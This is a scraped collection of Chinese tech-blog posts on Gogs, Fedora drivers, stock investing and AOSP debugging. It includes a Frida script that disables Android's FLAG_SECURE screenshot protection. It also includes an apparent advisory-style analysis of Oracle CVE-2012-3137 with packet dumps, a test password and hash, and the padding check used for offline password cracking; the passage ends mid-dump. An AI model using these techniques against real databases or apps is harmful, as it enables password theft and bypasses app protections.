review，如果能解决上面两个问题就好用很多了。下面两段是年前折腾 gogs 的记录，没有啥技术含量，只是做个备份。 切换皮肤https://github.com/Kos-M/GogsThemes 提供了两款皮肤，文中给出的方法要修改 gogs 配置，直接使用 TamperMonkey 就可以了。 1234567891011121314151617// ==UserScript==// @name Gogs Theme// @resource IMPORTED_CSS https://raw.githubusercontent.com/Kos-M/GogsThemes/master/themes/dark_theme.css// @namespace http://tampermonkey.net/// @version 0.1// @description try to take over the world!// @author You// @match http://website:8000/*// @grant GM_getResourceText// @grant GM_addStyle// ==/UserScript==(function() { 'use strict'; const my_css = GM_getResourceText(&quot;IMPORTED_CSS&quot;); GM_addStyle(my_css);})(); 使用后效果图 源码升级gogs 已经有一年多没有提供二进制的安装包了，看了改进不少，就尝试了源码升级。参考 https://gogs.io/docs/installation/install_from_source#%E6%B5%8B%E8%AF%95%E5%AE%89%E8%A3%85 安装 golang参考 Google 官方文档，执行下面命令就可以了。 https://go.dev/doc/install 123wget https://go.dev/dl/go1.17.6.linux-amd64.tar.gzrm -rf /usr/local/go &amp;&amp; tar -C /usr/local -xzf go1.17.6.linux-amd64.tar.gzexport PATH=$PATH:/usr/local/go/bin 编译123456# 克隆仓库到 &quot;gogs&quot; 子目录git clone --depth 1 https://github.com/gogs/gogs.git gogs# 修改工作目录cd gogs# 编译主程序，这个步骤会下载所有依赖go build -o gogs 编译过程会下载文件（需要自备梯子），编译完成后将在 gogs 工作目下生成 gogs 可执行文件 打包gogs 源码的 Makefile 提供了打包命令，执行 make pack 即可，将在 release 目生成 gogs.20220112095054.zip 迁移配置将 gogs.20220112095054.zip 解压，这就类似 gogs 的二进制升级了 https://gogs.io/docs/upgrade/upgrade_from_binary 1234mv gogs gogs_oldcp -R gogs_old/custom gogscp -R gogs_old/data gogscp -R gogs_old/log gogs gogs 0.13 的配置已经发生了变化，如果不修改配置执行 ./gogs web会出现错误 1232022/01/12 09:40:06 [ INFO] Gogs 0.13.0+dev2022/01/12 09:40:06 [FATAL] [...github/internal/route/install.go:75 GlobalInit()] Failed to initialize ORM engine:open database: failed to connect to `host=127.0.0.1 user=root database=gogs`: dial error (dial tcp 127.0.0.1:3306: connect: connection refused) 看错误像是在连接 mysql 的 3306 端口，可是配置文件设置的是使用 sqlite，非常困惑。上网搜索后证实是 gogs 0.13 的配置文件的字段修改了。 最关键的两个字段是数据库相关的 DB_TYPE 改为 TYPE， PASSWD 改为 PASSWORD 修改后 custom/conf/app.ini 后，执行 ./gogs web 一切正常。","link":"/cn/gogs/"},{"title":"github clone 加速","text":"国内因为众所周知的原因，git clone 一直很慢，最近可能状况就更糟糕了。@TeleMan 提供了一个信息，可以通过修改 host 文件达到加速效果。经过测试，只要修改两条记录即可 12199.232.69.194 github.global.ssl.fastly.net140.82.113.4 github.com 修改后，速度快多了，直连 12345678git clone https://github.com/googleprojectzero/winafl.git正克隆到 'winafl'...remote: Enumerating objects: 1538, done.remote: Counting objects: 100% (175/175), done.remote: Compressing objects: 100% (108/108), done.remote: Total 1538 (delta 90), reused 130 (delta 60), pack-reused 1363接收对象中: 100% (1538/1538), 5.29 MiB | 765.00 KiB/s, 完成.处理 delta 中: 100% (846/846), 完成. 使用一段时间后发现不是太稳定，终极大法还是需要一个长长的梯子，此方法记为备用方案。","link":"/cn/github_speed_up/"},{"title":"高效复盘技巧","text":"前些年总结的，现在看起来，过于复杂了，可能做短线的会有需求。","link":"/cn/fupangjiqiao/"},{"title":"基本面需要关注的点","text":"准备多写点东西，内容将不在局限于网络安全。 不得不说搞金融的这些人很厉害，各种玩法坑死大家了。除了一般需要关注的点，还需要关注几个地方，其实这些点在某些情况下比PE，ROE 啥的都重要： 可转债 （一堆家伙喜欢套利） 配股 （散户不太喜欢配股） 融资盘 （主力不喜欢太多人做轿子） 增发 （这个情况比较复杂，增发价是比较重要的） 质押 （太高可能暴雷） GDR （还是套利） 商誉 （可能要计提，影响净利润） 减持 （主力不喜欢给大股东抬轿子) 要了解这些情况最可靠的方法为读公告，一般情况雪球和东方财富股吧会有人讨论。 https://xueqiu.com/http://guba.eastmoney.com/","link":"/cn/fundamental/"},{"title":"【转】冯柳投资十大金句","text":"（一）经济的波动就像是剪羊毛，长好了就剪、剪完了再长。拿剪子的一般就是赢家，当然赢家之间也有互相剪的，所以就有大小赢家、长短赢家之分。 （二）技术分析主要是找出趋势和预期同向运动并强化的机会，价值分析则可以在反向运动但最终会被预期改变的机会上下注。 （三）各方面都完美的系统是不可能长期存在的，放弃效率和短期安全的系统往往才会是长期安全和可重复的。这不太符合人性，也就保证了系统的独特和有效性，也有利于将精力放在长期要素和战略点的思考上。 （四）涨跌都能令人坚定的才是好标的，跌令实的更实，因为价钱便宜了。涨令虚处显得确定，因为得到市场的确认和佐证了。这就是虚实结合带来的效果，如果涨几十个点就让人有想卖的感觉，那就说明虚处不足，就不太可能是好选择，最后也许连那几十个点也不容易挣到。反过来也是一样，跌了不敢重仓加的就说明实处不够，要多检讨下自己对确定性的把握能力。 （五）资产就是金钱在不同时间下的不同属性，本质就是现在的钱和未来的钱之间进行交换，买入是用现在换未来，卖出则是把未来换现在，关键要想明白未来和现在谁更值钱就好了。牛熊市就是这样的一个判断依据，当然，对极少数的优异公司来说，未来总是会强过现在的，这就是比牛熊大势更大的大势。 （六）市场在不断变化，企业也在不断变化，变化是常态，所以任何时候都要多方向的反复审视，对世界有敬畏心。这个敬畏就是要认识到事物总是在不断变化和出现意外的，所以要尽量让自己处于有保护的状态，尽量多的假设极端情况下的可靠性。 （七）当全世界都想通过股市来对抗通货膨胀的时候，也许拿着现金让其自然贬值会是更好的选择。除非你能找到明确的新增预期，否则凭什么指望别人以更高的价钱来购买已经给他人提供过保值机会的资产呢（房地产）。 （八）每个阶段的侧重点是不一样的。在高位的时候，我们要做计算题，要定量。因为一只股票涨了这么多、这么长时间，它的方向一定是没有问题的，这个时候你再去做定性研究意义不大。在低位的时候，如果你再去算账，就很容易吃大亏。它跌了这么久，那一定是方向上出了问题，你要把方向给想明白。如果能把方向证伪掉，是不需要考虑定量的问题，因为低位天然带有弹性和赔率。 （九）真正的投机应该是在价值的基础上进行的，是通过充分的价值理解后，将其在不同人群或环境下进行切换来获益。它认识到价值有主观倾向性和个性化的特点，价值不是个稳定具体的东西，也不存在用什么方法推算的公允值，因为资本以及资本后面的人是丰富不同的，他们有着不同的成本和收益预期，在各种市场环境下也会有着不同的预期因子和贴现率，而这些在乘数和复利计算的基础下就会有着巨大的差异。这也说明了为什么理性且信息充分对称的人之间也可以产生交易并实现双赢，其原因就在于他们有着不同的价值观、需求特点和满足感。 （十）长线投资很多人认为这是最容易做的，只要买进不动就可以了，其实这完全是误解。在所有的操作策略中，长线的要求最高。他需要对企业有着极为深刻的认识，对自己有着更为坚强的控制。他清楚把握企业未来数年的发展趋势，以投资的心态分享企业的成长。他的标的物是千里挑一，在这样的机会面前它不会惧怕任何亏损，不会设置除基本面外的任何止损指标。自信、尊重客观价值、不理会乃至勇于对抗市场是必备的投资品质，日常的波动在这样的前景面前是不应去考虑的。只有这样，股票才能够真正成为改变一生的东西。","link":"/cn/fengliu/"},{"title":"升级 Fedora 36，遇上 Nvidia 驱动问题","text":"Fedora 36 正式版已经释出一段时间了，根据我的经验开始的一周都会有 bug，一般等一段时间再升级会更平滑一些。然而，老革命又遇上了新问题，显示出问题了启动不起来。我已经很久没有遇上显示驱动问题了，我在很久以前就禁用了开源驱动 nouveau，一直都用得很好。 修改 /etc/default/grub 文件，在 GRUB_CMDLINE_LINUX 添加下面参数 1GRUB_CMDLINE_LINUX=&quot;... rd.driver.blacklist=nouveau modprobe.blacklist=nouveau nvidia-drm.modeset=1&quot; 重新生成 grub 文件， sudo grub2-mkconfig -o /boot/grub2/grub.cfg，但是在升级 Fedora 36 后似乎没有起作用。诡异的是 Fedora 35 的内核却可以正常工作，首先怀疑的是 nvidia 驱动可能没有安装对。执行下面命令行 12sudo dnf reinstall xorg-x11-drv-nvidia akmod-nvidia kmod-nvidia.x86_64sudo reboot 可惜没有解决问题，上网找资料看看 Fedora 36 有没什么特殊的地方。安装 Nvidia 驱动网上有这篇文章说的详细https://www.linuxcapable.com/how-to-install-nvidia-drivers-on-fedora-36-linux/仔细拜读了一下，还是没有发现啥问题，驱动也重新安装了啊，开始怀疑是新版 Nvidia 驱动的问题 sudo dnf search xorg-x11-drv-nvidia 可以查看所有的驱动，xorg-x11-drv-nvidia-340xx xorg-x11-drv-nvidia-340xx xorg-x11-drv-nvidia-340xx 不知道到底需要安装哪个版本的驱动。😭 123456789101112131415161718192021222324xorg-x11-drv-nvidia.x86_64 : NVIDIA's proprietary display driver for NVIDIA graphic cards=========================================================================== 名称 和 概况 匹配：xorg-x11-drv-nvidiaxorg-x11-drv-nvidia-340xx-cuda.x86_64 : CUDA libraries for xorg-x11-drv-nvidia-340xxxorg-x11-drv-nvidia-340xx-devel.i686 : Development files for xorg-x11-drv-nvidia-340xxxorg-x11-drv-nvidia-340xx-devel.x86_64 : Development files for xorg-x11-drv-nvidia-340xxxorg-x11-drv-nvidia-340xx-kmodsrc.x86_64 : xorg-x11-drv-nvidia-340xx kernel module source codexorg-x11-drv-nvidia-340xx-libs.i686 : Libraries for xorg-x11-drv-nvidia-340xxxorg-x11-drv-nvidia-340xx-libs.x86_64 : Libraries for xorg-x11-drv-nvidia-340xxxorg-x11-drv-nvidia-390xx-cuda.x86_64 : CUDA driver for xorg-x11-drv-nvidia-390xxxorg-x11-drv-nvidia-390xx-cuda-libs.i686 : CUDA libraries for xorg-x11-drv-nvidia-390xxxorg-x11-drv-nvidia-390xx-cuda-libs.x86_64 : CUDA libraries for xorg-x11-drv-nvidia-390xxxorg-x11-drv-nvidia-390xx-devel.i686 : Development files for xorg-x11-drv-nvidia-390xxxorg-x11-drv-nvidia-390xx-devel.x86_64 : Development files for xorg-x11-drv-nvidia-390xxxorg-x11-drv-nvidia-390xx-kmodsrc.x86_64 : xorg-x11-drv-nvidia-390xx kernel module source codexorg-x11-drv-nvidia-390xx-libs.i686 : Libraries for xorg-x11-drv-nvidia-390xxxorg-x11-drv-nvidia-390xx-libs.x86_64 : Libraries for xorg-x11-drv-nvidia-390xxxorg-x11-drv-nvidia-470xx-cuda.x86_64 : CUDA driver for xorg-x11-drv-nvidia-470xxxorg-x11-drv-nvidia-470xx-cuda-libs.i686 : CUDA libraries for xorg-x11-drv-nvidia-470xxxorg-x11-drv-nvidia-470xx-cuda-libs.x86_64 : CUDA libraries for xorg-x11-drv-nvidia-470xxxorg-x11-drv-nvidia-470xx-devel.i686 : Development files for xorg-x11-drv-nvidia-470xxxorg-x11-drv-nvidia-470xx-devel.x86_64 : Development files for xorg-x11-drv-nvidia-470xxxorg-x11-drv-nvidia-470xx-kmodsrc.x86_64 : xorg-x11-drv-nvidia-470xx kernel module source codexorg-x11-drv-nvidia-470xx-libs.i686 : Libraries for xorg-x11-drv-nvidia-470xxxorg-x11-drv-nvidia-470xx-libs.x86_64 : Libraries for xorg-x11-drv-nvidia-470xx 可是仔细一琢磨， Fedora 35 Nvidia 驱动不是工作正常吗，可以上去看看用的是哪个版本的驱动，执行命令 nvidia-settings,在 System Information 中发现使用的就是最新版本的驱动 510.68.02，看样子最新版本的驱动也没有问题，一下陷入了困境。😰 没啥好办法，还是 Google 搜索一下，结果发现了一个链接在讨论这个问题，和我遇上的现象一样，作者最终解决了问题Fedora Linux kernel update breaks NVIDIA driver 原来是旧版的驱动没有卸载干净，参考 https://rpmfusion.org/Howto/NVIDIA#Uninstall_the_NVIDIA_driver驱动卸载 Nvidia 驱动需要使用命令 dnf remove xorg-x11-drv-nvidia\\* 按照下面的命令操作了一遍，重启系统，熟悉的登录界面终于又出现了。😄 1234sudo dnf remove xorg-x11-drv-nouveausudo dnf remove xorg-x11-drv-nvidia\\*sudo dnf install xorg-x11-drv-nvidia akmod-nvidia kmod-nvidia.x86_64sudo reboot","link":"/cn/Fedora36-Nvidia/"},{"title":"Fedora31 的几个变化","text":"1. 默认启用 Cgroups V2nozuonodie， 升级到 Fedora 31 后， CgroupsV2 已经默认开启，理由是原来不是默认开启没人用，现在让 Fedora 用户先当当小白鼠，于是 Docker 就倒下了。http://t.cn/Ai1sI5LH grub2 配置文件 /etc/default/grub， 内核参数添加 systemd.unified_cgroup_hierarchy=0可以重新开启 CgroupsV1 ​​​​ 2. 默认的 Python 为 Python3https://fedoraproject.org/wiki/Changes/Python_means_Python3 唉，不得不说 Fedora 这次有点太激进了， 搞得我编译 chromium 又出问题了。 要换回去有个歪招 ln -s /usr/bin/python2 /usr/local/bin/python","link":"/cn/Fedora31/"},{"title":"恢复 Android App 的截屏功能","text":"今天遇上某 App 禁止截屏，其实就是使用了下面这段代码 1getWindow().setFlags(LayoutParams.FLAG_SECURE, LayoutParams.FLAG_SECURE); 使用 frida 脚本可以绕过绕过这个限制 （使用 frida 需要将手机 root）。 12345678910111213Java.perform(function () { // https://developer.android.com/reference/android/view/WindowManager.LayoutParams.html#FLAG_SECURE var FLAG_SECURE = 0x2000; var Window = Java.use(&quot;android.view.Window&quot;); var setFlags = Window.setFlags; //.overload(&quot;int&quot;, &quot;int&quot;) setFlags.implementation = function (flags, mask) { console.log(&quot;Disabling FLAG_SECURE...&quot;); flags &amp;= ~FLAG_SECURE; setFlags.call(this, flags, mask); // Since setFlags returns void, we don't need to return anything };}); 执行 frida 命令 frida -U -l disable.js -n com.apps.android --no-pause 1234567891011121314$ frida -U -l disable.js -n com.apps.android --no-pause[Pixel 2::com.apps.android]-&gt;[Pixel 2::com.apps.android]-&gt;[Pixel 2::com.apps.android]-&gt; Disabling FLAG_SECURE...Disabling FLAG_SECURE...Disabling FLAG_SECURE...Disabling FLAG_SECURE...Disabling FLAG_SECURE...Disabling FLAG_SECURE...Disabling FLAG_SECURE...Disabling FLAG_SECURE...Disabling FLAG_SECURE...Disabling FLAG_SECURE... 值得注意的是，这里使用了 -n 参数， attach 到目标进程，要不 App 会自动重启。看到输出调试信息后，就可以正常截屏了。 使用 objectionobjection「2」有此功能，执行下面命令即可： android ui FLAG_SECURE false 但是我测试失败了。 截屏小技巧 （lzx）Android 截屏，可以使用一个快速的技巧 adb exec-out screencap -p &gt; test.png 参考 [1] https://bhamza.me/2019/11/03/Android-Frida-hooking-disabling-FLAG-SECURE.html [2] https://github.com/sensepost/objection","link":"/cn/disable_security_flags/"},{"title":"调试AOSP Java 代码","text":"下载 Android 源代码，编译 12345$ source build/envsetup.sh$ lunch$ make$ mmm development/tools/idegen/$ ./development/tools/idegen/idegen.sh 运行后将生成下面几个文件 123android.ipr (IntelliJ / Android Studio)android.iml (IntelliJ / Android Studio).classpath (Eclipse) 在Android Studio 中导入 android.ipr File -&gt; Open 选择 android.ipr, 导入后可以Android Studio 中浏览AOSP 源码 设置远程调试配置文件 Run -&gt; Edit Configuration 点击左上角的 + 类型选择 Remote Attack 到需要调试的进程 这里有两种方法，一是使用SDK 提供的 Monitor 二是使用 Android Studio 自带的Attach debugger to Android Process 按钮。 连接成功后将看到 Connected to the target VM 设置断点 设置断点很简单，用鼠标点击源码文件的左边栏，看见红色圆点说明就已经设置成功了。也可以使用Ctrl + F8 的快捷键。 运行程序，触发断点 需要注意的是在调试过程中会出现源码对不上的情况，需要自己选择正确的源码。关于哪些进程可以调试的问题，上篇已经有记录，这里就不在说了。 参考资料 AOSP Sources in the IDEhttps://newcircle.com/s/post/1720/aosp_sources_in_the_ide Debugging AOSP Platform code with Android Studio - Part I - Java Debuggerhttp://ronubo.blogspot.sg/2016/01/debugging-aosp-platform-code-with.html","link":"/cn/debug_aosp_java_code/"},{"title":"Oracle Database身份验证协议安全限制绕过漏洞(CVE-2012-3137)","text":"12345678910111213NSFOCUS ID: 20847BUGTRAQ ID: 55651CVE ID: CVE-2012-3137远程漏洞： 是本地漏洞： 是漏洞类型：漏洞影响： 远程攻击者可以密码进行离线密码暴力破解危险指数： 高创建时间： 2012-9-27更新时间：攻击代码： 无跟踪工程师： zz 漏洞概述:Oracle是一款广泛被使用的商业数据库。 Oracle O5LOGON认证协议存在漏洞，这个漏洞可以使攻击者离线暴力破解Oracle数据库密码，从而访问受保护的Oracle数据库中的数据。要利用这个漏洞攻击者只需要知道一个合法的数据库用户名和一个正确的数据库名(SID)，不需要使用中间人攻击。 Martinez Fayo 在2010年5月向Oracle报告了这个问题，Oracle在2011年的中期通过patch set 11.2.0.3修复了这个漏洞，使用了新版本的协议。但是Oracle没有在 11.1和11.2 中修复这个问题，因此这些版本仍然存在漏洞。 由于漏洞发生在认证阶段的早期，获取需要的数据后马上断开连接，不会在Oracle数据库里留下登录日志，因此这个漏洞被称为 “stealth password cracking vulnerability” 细节： O5LOGON 过程 12345678 send usernameClient -----------------------------&gt; Server AUTH_SESSKEY AUTH_VFR_DATAClient &lt;---------------------------- Server AUTH_SESSKEY AUTH_PASSWORDClinet -----------------------------&gt; Server 和这个漏洞相关的两个报文，包含了需要的信息, 如下： (1) Server -&gt; client 123456789101112131415160000 00 f8 00 00 06 00 00 00 00 00 08 02 00 0c 00 00 ................0010 00 0c 41 55 54 48 5f 53 45 53 53 4b 45 59 60 00 ..AUTH_SESSKEY`.0020 00 00 60 35 32 46 43 30 34 42 31 46 46 38 31 31 ..`52FC04B1FF8110030 30 43 41 31 32 36 33 44 46 35 42 43 36 31 41 37 0CA1263DF5BC61A70040 45 35 37 37 34 30 43 38 41 35 31 31 31 44 32 32 E57740C8A5111D220050 42 34 31 45 35 33 43 43 31 36 37 46 44 46 32 41 B41E53CC167FDF2A0060 36 38 37 38 39 35 38 32 30 30 44 39 42 32 42 36 6878958200D9B2B60070 41 35 31 43 39 35 44 37 37 39 46 44 45 42 41 42 A51C95D779FDEBAB0080 42 36 39 00 00 00 00 0d 00 00 00 0d 41 55 54 48 B69.........AUTH0090 5f 56 46 52 5f 44 41 54 41 14 00 00 00 14 34 33 _VFR_DATA.....4300a0 45 30 42 45 32 30 42 33 32 42 30 42 42 37 36 45 E0BE20B32B0BB76E00b0 35 37 25 1b 00 00 04 01 00 00 00 02 00 00 00 00 57%.............00c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................00d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................00e0 00 00 00 02 00 00 00 00 00 00 00 00 00 00 00 00 ................00f0 00 00 00 00 00 00 00 00 ........ (2) server &lt;- client 123456789101112131415161718192021222324252627282930313233343536373839404142430000 03 73 03 d0 1a 05 0a 09 00 00 00 21 01 00 00 44 .s.........!...D0010 46 bf bf 0d 00 00 00 ec 42 bf bf d8 53 bf bf 03 F.......B...S...0020 73 79 73 24 00 00 00 0c 41 55 54 48 5f 53 45 53 sys$....AUTH_SES0030 53 4b 45 59 20 01 00 00 fe 40 46 41 36 44 43 44 SKEY ....@FA6DCD0040 30 46 33 38 39 45 39 32 44 31 38 46 38 31 38 38 0F389E92D18F81880050 45 43 36 39 33 31 33 42 35 32 34 46 34 32 31 31 EC69313B524F42110060 38 34 46 41 45 36 37 39 36 31 33 41 37 32 46 43 84FAE679613A72FC0070 38 44 46 44 30 41 34 43 37 42 20 42 39 33 41 36 8DFD0A4C7B B93A60080 41 43 42 38 45 30 35 42 38 32 35 38 41 30 32 30 ACB8E05B8258A0200090 44 32 39 35 34 45 43 31 42 36 33 00 01 00 00 00 D2954EC1B63.....00a0 27 00 00 00 0d 41 55 54 48 5f 50 41 53 53 57 4f '....AUTH_PASSWO00b0 52 44 c0 00 00 00 40 32 43 35 46 39 35 37 41 36 RD....@2C5F957A600c0 35 33 32 41 44 39 31 44 39 31 36 46 34 45 35 46 532AD91D916F4E5F00d0 41 37 44 32 46 44 41 30 45 36 43 44 46 46 42 41 A7D2FDA0E6CDFFBA00e0 41 45 44 38 38 33 43 41 46 34 46 32 30 30 43 38 AED883CAF4F200C800f0 39 38 33 41 45 33 44 00 00 00 00 18 00 00 00 08 983AE3D.........0100 41 55 54 48 5f 52 54 54 0f 00 00 00 05 36 36 37 AUTH_RTT.....6670110 30 38 00 00 00 00 27 00 00 00 0d 41 55 54 48 5f 08....'....AUTH_0120 43 4c 4e 54 5f 4d 45 4d 0c 00 00 00 04 34 30 39 CLNT_MEM.....4090130 36 00 00 00 00 27 00 00 00 0d 41 55 54 48 5f 54 6....'....AUTH_T0140 45 52 4d 49 4e 41 4c 12 00 00 00 06 70 74 73 2f ERMINAL.....pts/0150 31 38 00 00 00 00 2d 00 00 00 0f 41 55 54 48 5f 18....-....AUTH_0160 50 52 4f 47 52 41 4d 5f 4e 4d 51 00 00 00 1b 73 PROGRAM_NMQ....s0170 71 6c 70 6c 75 73 40 68 65 6e 69 63 65 73 20 28 qlplus@henices (0180 54 4e 53 20 56 31 2d 56 33 29 00 00 00 00 24 00 TNS V1-V3)....$.0190 00 00 0c 41 55 54 48 5f 4d 41 43 48 49 4e 45 15 ...AUTH_MACHINE.01a0 00 00 00 07 68 65 6e 69 63 65 73 00 00 00 00 18 ....henices.....01b0 00 00 00 08 41 55 54 48 5f 50 49 44 0c 00 00 00 ....AUTH_PID....01c0 04 36 32 32 38 00 00 00 00 18 00 00 00 08 41 55 .6228.........AU01d0 54 48 5f 53 49 44 15 00 00 00 07 68 65 6e 69 63 TH_SID.....henic01e0 65 73 00 00 00 00 18 00 00 00 08 41 55 54 48 5f es.........AUTH_01f0 41 43 4c 0c 00 00 00 04 34 34 30 30 00 00 00 00 ACL.....4400....0200 36 00 00 00 12 41 55 54 48 5f 41 4c 54 45 52 5f 6....AUTH_ALTER_0210 53 45 53 53 49 4f 4e 6f 00 00 00 25 41 4c 54 45 SESSIONo...%ALTE0220 52 20 53 45 53 53 49 4f 4e 20 53 45 54 20 54 49 R SESSION SET TI0230 4d 45 5f 5a 4f 4e 45 3d 27 2b 30 38 3a 30 30 27 ME_ZONE='+08:00'0240 00 01 00 00 00 45 00 00 00 17 41 55 54 48 5f 4c .....E....AUTH_L0250 4f 47 49 43 41 4c 5f 53 45 53 53 49 4f 4e 5f 49 OGICAL_SESSION_I0260 44 60 00 00 00 20 43 41 41 38 39 33 41 43 30 41 D`... CAA893AC0A0270 34 33 30 46 41 30 45 30 34 30 30 30 37 46 30 31 430FA0E040007F010280 30 31 31 38 35 34 00 00 00 00 30 00 00 00 10 41 011854....0....A0290 55 54 48 5f 46 41 49 4c 4f 56 45 52 5f 49 44 00 UTH_FAILOVER_ID.02a0 00 00 00 00 00 00 00 ....... 1234AUTH_SESSKEY_SRV: 52FC04B1FF8110CA1263DF5BC61A7E57740C8A5111D22B41E53CC167FDF2A6878958200D9B2B6A51C95D779FDEBABB69AUTH_SESSKEY_CLI: FA6DCD0F389E92D18F8188EC69313B524F421184FAE679613A72FC8DFD0A4C7BB93A6ACB8E05B8258A020D2954EC1B63AUTH_PASSWORD : 2C5F957A6532AD91D916F4E5FA7D2FDA0E6CDFFBAAED883CAF4F200C8983AE3DAUTH_VFR_DATA : 43E0BE20B32B0BB76E57 Oracle O5LOGON 协议介绍Oracle 11g password hash 算法为, 用户名 sys, 密码 nsfocus 123&gt;&gt;&gt; import hashlib&gt;&gt;&gt; hashlib.sha1('nsfocus' + '\\x43\\xE0\\xBE\\x20\\xB3\\x2B\\x0B\\xB7\\x6E\\x57').hexdigest()'c3d98762d258d4bd92c572065ddea9af38123f88' 可以在Oracle数据中查询: 1234567891011SQL&gt; select name, password, spare4 from sys.user$ where name = 'SYS';NAME PASSWORD------------------------------ ------------------------------SPARE4--------------------------------------------------------------------------------SYS 0F2417000362F55FS:C3D98762D258D4BD92C572065DDEA9AF38123F8843E0BE20B32B0BB76E57password hash： C3D98762D258D4BD92C572065DDEA9AF38123F88salt ： 43E0BE20B32B0BB76E57 client 发送用户名给server2 server 判断是否是可用的用户名，如果用户名可用，进入下一步。 Server 加密AUTH_SESSKEY, 取出 salt 使用AES192 CBC 加密AUTH_SESSKEY, key为oralce数据库中的20字节的password hash和4个零(192bit)。 Server 将加密的AUTH_SESSKEY和AUTH_VFR_DATA 发送给ClientAUTH_VFR_DATA 为salt Client计算password hash (通过用户输入的密码), 使用Client计算的password hash(加上4个零)为key 使用AES192 CBC算法加密Client AUTH_SESSKEY Client 计算 Combine_SessKey将解密的Server AUTH_SESSKEY 和 Client AUTH_SESSKEY的第17个字节开始的24个字节做异或，将异或结果的前16字节做MD5, 后8字节做MD5, 得到Combine_SessKey Client 使用 Combine_SessKey 加密用户输入的密码明文，得到 AUTH_PASSWORD使用算法为AES192 CBC Client 将加密的Client AUTH_SESSKEY和加密的AUTH_PASSWORD 发送给 Server Server 使用数据库中的 password hash 解密 Client AUTH_SESSKEY Server 尝试解密AUTH_PASSWORD 解密成功则认证通过 参看:http://www.oxid.it/downloads/oracle_tns_aes192_check.txt 这个漏洞是生成server sesskey 时，在末尾添加了8个0x08, 因为salt已知（由服务器返回），因此我们只需尝试计算SHA-1的password hash，然后利用这个password hash 去解密server sesskey， 只要末尾是8个0x08 则说明这是正确的server sesskey，此时使用的密码为正确的密码，原因是 AES 192 加密块长度为128 bit (16 byte), 分组加密如果明文内容不是块长度的整数倍时需要填充。填充部分的内容为差的字节数，比如11字节的明文，需要在末尾填充5个0x5 从汇编代码里分析server session key 的生成过程，分析的程序为 Oracle.exe 11.2.0.1.0oracle.exe调用 oran11.ztvo5ke 加密session key oran11.ztvo5ke -&gt; oracrypt11.ztceenc -&gt; orancrypt11.ztcen 1234567891011121314151617struct e_key { unsigned char s[2]; unsigned char key[100];};struct sess_key { uint32_t type; unsigned char key[40];}struct pwd_hash { uint32_t unknown1; uint32_t hash_len; unsigned char hash[20];}ztvo5ke ( e_key*, sess_key*, pwd_hash*, int); sess_key.type == 0x1492 ( AES 192 ) plaintext 24 + 16 = 40 123456789101112131415161718.text:101BC481 push eax ; unknown structure.text:101BC482 push edx ; encrypted session key.text:101BC483 push 28h ; length.text:101BC485 push ecx ; plaintext session key.text:101BC486 push 0.text:101BC488 push ebx ; 0x18.text:101BC489 push 87004001h.text:101BC48E call ztceenc ; AES 192.text:101BC493 add esp, 1Ch.text:101BC496 mov ebx, eax.text:101BC498 test ebx, ebx.text:101BC49A jnz short loc_101BC4B8.text:101BC49C lea edx, [ebp+var_A4].text:101BC4A2 lea eax, [edi+2].text:101BC4A5 push eax ; e_key+2.text:101BC4A6 push [ebp+var_C8].text:101BC4AC push edx ; encryted session key.text:101BC4AD call ztucbtx ztceenc 运行前后的情况 12345678910111213141516171819202122232425262728293031323334353637383940414243440DC3A4E4 40 00 00 00 0DC3A4F4 00 00 00 00 00 00 00 00 00 00 00 00 10 00 00 00.. 0DC3A504 0C 4A FE 0C 02 00 00 00 FF FF FF FF 13 00 00 00.. 0DC3A514 02 00 00 00 00 00 00 00 14 00 00 00 14 00 00 00.. 0DC3A524 44 94 3E 10 00 00 00 00 00 00 00 00 00 00 00 00.. 0DC3A534 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00.. 0DC3A544 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00.. 0DC3A554 7A EF 5B 9E 89 D3 9F 07 62 A8 83 BB C6 4D 9F D9.. 0DC3A564 EA 7B 90 1C 49 9B 73 36 BE 60 AF F6 69 A4 ED 37.. 0DC3A574 8D 1D B3 B7 60 30 C7 56 00 00 00 00 8C A5 C3 0D.. 0DC3A584 C8 B3 13 21 77 BF F6 84 28 3A D6 54 9F 65 96 0B.. 0DC3A594 0E 0A E4 60 00 00 00 00 00 00 00 00 00 00 00 00.. 0DC3A5A4 18 00 00 00 84 A5 C3 0D E0 3E FE 0C A8 46 A7 0C.. 0DC3A5B4 94 77 FE 0C 0C C6 C3 0D 4A EA 50 01 F4 C4 C3 0D.. 0DC3A5C4 F8 49 FE 0C 10 FB EC 0D.......................... eax = 0DC3A4F0 edx = 0DC3A514 ecx = 0DC3A554 ebx = 0DC3A5A4 0DC3A4E4 30 00 00 00.. 0DC3A4F4 00 00 00 00 00 00 00 00 00 00 00 00 10 00 00 00.. 0DC3A504 0C 4A FE 0C 02 00 00 00 FF FF FF FF 13 00 00 00.. 0DC3A514 61 15 91 7F D6 AE B9 29 00 07 A4 02 A6 B1 2B AA.. 0DC3A524 BD 3B AA 0C 13 C0 E5 18 8E FE BA AC F5 4C 01 BE. 0DC3A534 96 8F 59 0D B9 9E 2C F6 98 74 1F EF 22 CE 17 47.. 0DC3A544 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00.. 0DC3A554 7A EF 5B 9E 89 D3 9F 07 62 A8 83 BB C6 4D 9F D9.. 0DC3A564 EA 7B 90 1C 49 9B 73 36 BE 60 AF F6 69 A4 ED 37.. 0DC3A574 8D 1D B3 B7 60 30 C7 56 00 00 00 00 8C A5 C3 0D.. 0DC3A584 C8 B3 13 21 77 BF F6 84 28 3A D6 54 9F 65 96 0B.. 0DC3A594 0E 0A E4 60 00 00 00 00 00 00 00 00 00 00 00 00.. 0DC3A5A4 18 00 00 00 84 A5 C3 0D E0 3E FE 0C A8 46 A7 0C.. 0DC3A5B4 94 77 FE 0C 0C C6 C3 0D 4A EA 50 01 F4 C4 C3 0D.. 0DC3A5C4 F8 49 FE 0C 10 FB EC 0D0DC3A4F0 30 00 00 00 offset0DC3A514 61 15 91 7F ... encrypted session key (0x30 byte)0DC3A554 7A EF 5B 9E ... plaintext session key (0x28 byte)0DC3A584 8 B3 13 21 ... password hash (0x18 byte) AES 192 加密40字节的明文，需要填充 8个 0x08 11.1 1234567PASSWORD: nsfocusAUTH_SESSKEY: 43FD38029377C84620AE1851FC1D231409985064DEA0D0B8D48E50E6051751A5D8FDFEAAA9F83B99F37B051FA67F8546AUTH_SESSKEY_CLIENT: 